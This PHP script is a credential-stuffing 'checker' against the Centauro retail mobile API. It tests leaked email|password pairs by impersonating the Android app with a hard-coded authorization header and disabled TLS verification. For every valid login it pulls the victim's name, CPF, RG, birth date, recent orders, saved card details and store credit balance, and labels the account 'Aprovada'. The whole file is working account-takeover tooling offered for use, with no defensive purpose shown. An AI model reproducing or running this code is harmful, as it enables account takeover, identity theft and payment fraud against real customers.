<?php
extract($_GET);
error_reporting(0);
set_time_limit(0);
// DEFINE O FUSO HORARIO COMO O HORARIO DE BRASILIA
date_default_timezone_set('America/Sao_Paulo');
// CRIA UMA VARIAVEL E ARMAZENA A HORA ATUAL DO FUSO-HORÀRIO DEFINIDO (BRASÍLIA)
$dataLocal = date('d/m/Y H:i:s', time());
///////////////////////////////////////////////////////////////////////////////
#Variavel
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function getStr($string, $start, $end, $value) {
  $str = explode($start, $string);
  $str = explode($end, $str[$value]);
  return $str[0];
}
////////////////////////////////////////////////////////////////////////////////
//Lista {}
$separa = explode("|", $lista);
$email = trim($separa[0]);
$senha = trim($separa[1]);


/////////////////////////////////////////////////////////////////////////
#cookie
$ckfile = getcwd() . "/cookie_" . rand(11111, 99999) . ".txt";
if (file_exists($ckfile))
    unlink($ckfile);
/* deletar cookies */
$lis = scandir(getcwd());
foreach ($lis as $v) {
    if (strpos($v, 'cookie_') !== false) {
        if (file_exists($v))
            unlink($v);
    }
}
////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.centauro.appsbnet.com.br/v2.1/clientes/login');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Centauro/1.8.1 (samsung dream2lteks; 4.4.2 API 19)','Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-UserAgent: android','x-cv-id: 14','Content-Type: application/json; charset=UTF-8','Host: api.centauro.appsbnet.com.br','Connection: Keep-Alive'));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usuario":"'.$email.'","senha":"'.$senha.'","ManterLogado":true}');
$step_1 = curl_exec($ch);
///////////////////////////////////////////////////////////////////////////////
$Tokenss = json_decode($step_1, true);
///////////////////////////////////////////////////////////////////////////////
$refreshToken = $Tokenss["token"];
///////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.centauro.appsbnet.com.br/v3/clientes');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Centauro/1.8.1 (samsung dream2lteks; 4.4.2 API 19)','Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-UserAgent: android','x-cv-id: 14','Content-Type: application/json; charset=UTF-8','Host: api.centauro.appsbnet.com.br','Connection: Keep-Alive','x-client-token: '.$refreshToken.''));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$step_2 = curl_exec($ch);
///////////////////////////////////////////////////////////////////////////////
$DadosCadastrai = json_decode($step_2, true);
///////////////////////////////////////////////////////////////////////////////
$estado = $DadosCadastrai["endereco"]["estado"];
$cidade = $DadosCadastrai["endereco"]["cidade"];
$nome = $DadosCadastrai["nome"];
$sobrenome = $DadosCadastrai["sobrenome"];
$cpf = $DadosCadastrai["cpf"];
$rg = $DadosCadastrai["rg"];
$dataDeNascimento = $DadosCadastrai["dataDeNascimento"];
//////////////////////////////////////////////////////////////////////////////
curl_setopt($ch, CURLOPT_URL, 'https://api.centauro.appsbnet.com.br/v2.1/clientes/pedidos?quantidade=10&pular=0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Centauro/1.8.1 (samsung dream2lteks; 4.4.2 API 19)','Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-UserAgent: android','x-cv-id: 14','Content-Type: application/json; charset=UTF-8','Host: api.centauro.appsbnet.com.br','Connection: Keep-Alive','x-client-token: '.$refreshToken.''));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$step_3 = curl_exec($ch);
///////////////////////////////////////////////////////////////////////////////
$pedidoscadastrai = json_decode($step_3, true);
///////////////////////////////////////////////////////////////////////////////
$total = $pedidoscadastrai["ultimoPedido"]["total"];
$statusPedido = $pedidoscadastrai["ultimoPedido"]["statusPedido"];
$pagamentoDescricao = $pedidoscadastrai["ultimoPedido"]["pagamentoDescricao"];
///////////////////////////////////////////////////////////////////////////////
if($total ==""){
$pedidocompleto = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
}else{
$pedidocompleto = 'Total: '.$total.' Pagamento: '.$pagamentoDescricao.' Statu: '.$statusPedido.'';
}
//////////////////////////////////////////////////////////////////////////////
curl_setopt($ch, CURLOPT_URL, 'https://api.centauro.appsbnet.com.br/v2.2/cartoes');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Centauro/1.8.1 (samsung dream2lteks; 4.4.2 API 19)','Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-UserAgent: android','x-cv-id: 14','Content-Type: application/json; charset=UTF-8','Host: api.centauro.appsbnet.com.br','Connection: Keep-Alive','x-client-token: '.$refreshToken.''));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$tep_3 = curl_exec($ch);
///////////////////////////////////////////////////////////////////////////////
$cartaocadastrai = json_decode($tep_3, true);
///////////////////////////////////////////////////////////////////////////////
$administradora = $cartaocadastrai["cartoesOneClickBuy"][0]["administradora"];
$nomeTitular = $cartaocadastrai["cartoesOneClickBuy"][0]["nomeTitular"];
$anoValidade = $cartaocadastrai["cartoesOneClickBuy"][0]["anoValidade"];
$mesValidade = $cartaocadastrai["cartoesOneClickBuy"][0]["mesValidade"];
$numeroMascarado = $cartaocadastrai["cartoesOneClickBuy"][0]["numeroMascarado"];
///////////////////////////////////////////////////////////////////////////////
if($numeroMascarado ==""){
$DadosCardCompleto = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
}else{
$DadosCardCompleto = 'Nome: '.$nomeTitular.' Card: '.$numeroMascarado.'/'.$mesValidade.'/'.$anoValidade.' Bandeira: '.$administradora.'';
}
//////////////////////////////////////////////////////////////////////////////
curl_setopt($ch, CURLOPT_URL, 'https://api.centauro.appsbnet.com.br/v2.2/clientes/valetrocas');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) .'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Centauro/1.8.1 (samsung dream2lteks; 4.4.2 API 19)','Authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-UserAgent: android','x-cv-id: 14','Content-Type: application/json; charset=UTF-8','Host: api.centauro.appsbnet.com.br','Connection: Keep-Alive','x-client-token: '.$refreshToken.''));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$tep_4 = curl_exec($ch);
///////////////////////////////////////////////////////////////////////////////
$valetrocass = json_decode($tep_4, true);
///////////////////////////////////////////////////////////////////////////////
$podeUtilizar = $valetrocass["listaValeTroca"][0]["podeUtilizar"];
$criadoEm = $valetrocass["listaValeTroca"][0]["criadoEm"];
$saldo = $valetrocass["listaValeTroca"][0]["saldo"];
///////////////////////////////////////////////////////////////////////////////
if($saldo ==""){
$valetrocacompleto = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
}else{
$valetrocacompleto = 'Saldo: '.$saldo.' criadoEm: '.$criadoEm.'';
}
///////////////////////////////////////////////////////////////////////////////
if($cpf ==""){
$Cpf1 = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
}else{
$Cpf1 = $cpf;
}
///////////////////////////////////////////////////////////////////////////////
if($nome ==""){
$nome1 = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
}else{
$nome1 = $nome.' '.$sobrenome;
}
///////////////////////////////////////////////////////////////////////////////
if($dataDeNascimento ==""){
$dataDeNascimento1 = '<i class="fa fa-times-circle" style="font-size:20px;color:#f49f30;" data-toggle="tooltip" data-original-title="Não encontrado"></i></font>';
} else {
$dataDeNascimento1 = $dataDeNascimento;
}
///////////////////////////////////////////////////////////////////////////////
//Checker Finalizado {}
if (strpos($step_1, '{"token":"') !== false) {

echo "<p style='color:white';>Aprovada $email |$senha Nome: $nome1 Cpf: $Cpf1 Pedidos: $pedidocompleto Dados Do Cartão: $DadosCardCompleto Vale :$valetrocacompleto CENTRAL 1.0</p>";

} elseif (strpos($step_1, 'Usuário ou Senha inválido!') !== false) {
 echo "Reprovada $email |$senha  Retorno:(Usuário ou Senha inválido!)<br>";
} elseif (strpos($step_1, 'O campo senha é de preenchimento obrigatório.') !== false) {
echo " Reprovada $emai |$senha Rertono:(O campo senha é de preenchimento obrigatório.)";
}else{

echo "$email | $senha";

}
flush();
ob_flush();
?>